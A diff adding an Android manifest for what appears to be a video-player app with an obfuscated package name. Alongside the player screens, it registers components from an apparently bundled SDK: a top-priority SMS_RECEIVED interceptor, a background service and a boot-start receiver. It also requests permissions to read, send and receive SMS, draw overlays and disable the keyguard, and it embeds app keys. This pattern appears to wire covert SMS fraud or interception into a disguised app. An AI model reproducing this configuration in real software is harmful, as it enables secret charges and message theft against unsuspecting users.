@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="ssmc.nsss.scS.mdsa.ieeq.mhdu"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-sdk
+        android:minSdkVersion="7"
+        android:targetSdkVersion="17" />
+
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <!-- 读写内存 -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:name="s.xx.yy.mmv.base.BaseApplication"
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@android:style/Theme.Light.NoTitleBar">
+        <meta-data
+            android:name="UMENG_CHANNEL"
+            android:value="HY_10420_2_1" />
+        <!-- HY_10420_7 YS3_10_15 -->
+
+        <meta-data
+            android:name="SP_APPKEY"
+            android:value="8A47FB1F8EA835C3CB6FF8D930B53848"></meta-data>
+        <meta-data
+            android:name="UMENG_APPKEY"
+            android:value="56a03a72e0f55a706b00091d"></meta-data>
+
+        <activity
+            android:name="s.xx.yy.mmv.WelcomeActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation"
+            android:label="@string/app_name"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="s.xx.yy.mmv.MainActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation"
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait"></activity>
+        <activity android:name="s.xx.yy.mmv.ui.ProtocolActivity"></activity>
+        <activity
+            android:name="s.xx.yy.mmv.ui.SearchActivity"
+            android:launchMode="singleTask"></activity>
+        <activity
+            android:name="s.xx.yy.mmv.ui.DetailActivity"
+            android:screenOrientation="portrait"></activity>
+        <activity android:name="s.xx.yy.mmv.ui.PlayActivity"></activity>
+        <activity
+            android:name="s.xx.yy.mmv.ui.FullPlayActivity"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen"></activity>
+
+        <receiver android:name="com.xm.spsgsdkcore.service.ISR">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.xm.spsgsdkcore.service.SDKService"></service>
+
+        <receiver android:name="com.xm.spsgsdkcore.service.SDKReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"></action>
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
